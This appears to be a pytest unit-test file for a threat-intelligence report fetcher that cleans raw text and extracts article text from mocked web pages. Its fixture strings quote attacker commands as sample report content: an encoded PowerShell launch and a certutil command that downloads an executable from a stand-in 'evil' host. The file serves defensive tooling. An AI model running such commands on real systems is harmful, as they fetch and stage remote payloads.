"""Unit tests for CTI text fetching and validation."""

import pytest

from app.tools.cti_fetcher import CTIFetchError, fetch_cti_text


def test_fetch_cti_text_from_raw_text() -> None:
    text = fetch_cti_text(raw_text="Threat actors ran powershell.exe -enc SQBFAFgA...\n\n\n\nObserved persistence.")
    assert "powershell.exe" in text
    assert "\n\n\n" not in text


def test_fetch_cti_text_rejects_short_raw_text() -> None:
    with pytest.raises(CTIFetchError):
        fetch_cti_text(raw_text="too short")


def test_fetch_cti_text_rejects_invalid_url() -> None:
    with pytest.raises(CTIFetchError):
        fetch_cti_text(url="ftp://example.com/report")


def test_fetch_cti_text_extracts_url(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        "app.tools.cti_fetcher.trafilatura.fetch_url",
        lambda _url: "<html><body><article>Adversary executed certutil.exe -urlcache -split -f http://evil/a.exe</article></body></html>",
    )
    monkeypatch.setattr(
        "app.tools.cti_fetcher.trafilatura.extract",
        lambda _html, **_kwargs: "Adversary executed certutil.exe -urlcache -split -f http://evil/a.exe to stage payload.",
    )

    result = fetch_cti_text(url="https://example.com/advisory")
    assert "certutil.exe" in result


def test_fetch_cti_text_raises_when_download_fails(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("app.tools.cti_fetcher.trafilatura.fetch_url", lambda _url: None)
    with pytest.raises(CTIFetchError):
        fetch_cti_text(url="https://example.com/missing")
